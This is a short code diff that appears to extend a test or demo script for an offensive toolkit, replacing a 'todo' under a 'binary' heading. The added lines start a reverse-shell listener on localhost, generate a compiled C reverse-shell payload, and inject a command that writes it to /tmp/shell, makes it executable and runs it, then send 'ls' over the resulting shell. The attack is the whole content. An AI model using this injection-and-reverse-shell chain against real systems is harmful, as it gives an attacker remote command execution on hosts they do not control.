@@ -81,6 +81,21 @@ listener.stop()
 
 print('----------------binary:')
 
-print('todo')
+ip = "127.0.0.1"
+port = 8999
+
+listener = ReverseListener(ip, port, once=True, cb=lambda: 'ls')
+
+listener.start()
+
+payload = Generator.bin(lhost=ip, lport=port, lang='c')
+assert payload is not None
+
+cmd = f'printf "{payload}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'
+
+res = monkey.inject_fetch({ 'command': cmd })
+print(res)
+
+listener.stop()
 
 quit()
